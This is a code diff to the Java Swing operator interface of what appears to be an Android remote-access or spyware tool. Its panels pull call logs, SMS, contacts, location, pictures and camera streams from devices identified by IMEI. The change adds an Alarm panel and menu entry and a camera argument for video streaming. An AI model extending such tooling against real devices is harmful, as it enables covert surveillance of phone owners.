@@ -1,16 +1,6 @@
 package gui;
 
-import gui.panel.CallLogPanel;
-import gui.panel.ColorPane;
-import gui.panel.ContactPanel;
-import gui.panel.FileTreePanel;
-import gui.panel.HomePanel;
-import gui.panel.MapPanel;
-import gui.panel.MonitorPanel;
-import gui.panel.PicturePanel;
-import gui.panel.SMSLogPanel;
-import gui.panel.SoundPanel;
-import gui.panel.VideoPanel;
+import gui.panel.*;
 
 import inout.Protocol;
 import utils.Contact;
@@ -67,6 +57,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private VideoPanel videoPanel;
 	private ColorPane userLogPanel;
 	private SMSLogPanel smsPanel;
+	private AlarmPanel alarmPanel;
 	
 	private HashMap<JPanel, Integer> panChanMap;
 	
@@ -266,6 +257,8 @@ public class UserGUI extends JFrame implements WindowListener {
 	public void fireTakePicture(String cam) {
 		gui.fireTakePicture(imei,cam);
 	}
+
+	public void fireSetAlarm(byte[] args){gui.fireAlarm(imei,args);}
 	
 	
 	// *********************
@@ -312,8 +305,8 @@ public class UserGUI extends JFrame implements WindowListener {
 	/**
 	 * Methode zum Starten des Videostreams.
 	 */
-	public void fireStartVideoStream() {
-		gui.fireStartVideoStream(imei);
+	public void fireStartVideoStream(byte[] cam) {
+		gui.fireStartVideoStream(imei, cam);
 	}
 
 	/**
@@ -641,6 +634,14 @@ public class UserGUI extends JFrame implements WindowListener {
 		tabbedPane.setSelectedComponent(videoPanel);
 	}
 
+	private void fireButtonAlarm() {
+		if(alarmPanel == null) {
+			alarmPanel = new AlarmPanel(this);
+			tabbedPane.addTab("Alarm", alarmPanel);
+		}
+		tabbedPane.setSelectedComponent(alarmPanel);
+	}
+
 	/**
 	 * Diese Methode ist zum Erstellen und Hinzufügen des Smspanels vorhanden.
 	 */
@@ -651,6 +652,8 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(smsPanel);
 	}
+
+
 
 	/**
 	 * Diese Methode ist zum Erstellen und Hinzufügen des Toastdialogs vorhanden.
@@ -800,6 +803,14 @@ public class UserGUI extends JFrame implements WindowListener {
 			}
 		});
 		mnRcuprationDeDonnes.add(mntmSms);
+
+		JMenuItem mntmAlarm = new JMenuItem("Alarm");
+		mntmAlarm.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				fireButtonAlarm();
+			}
+		});
+		mnRcuprationDeDonnes.add(mntmAlarm);
 		
 		JMenu mnStreaming = new JMenu("Streaming");
 		mnRcuprationDeDonnes.add(mnStreaming);
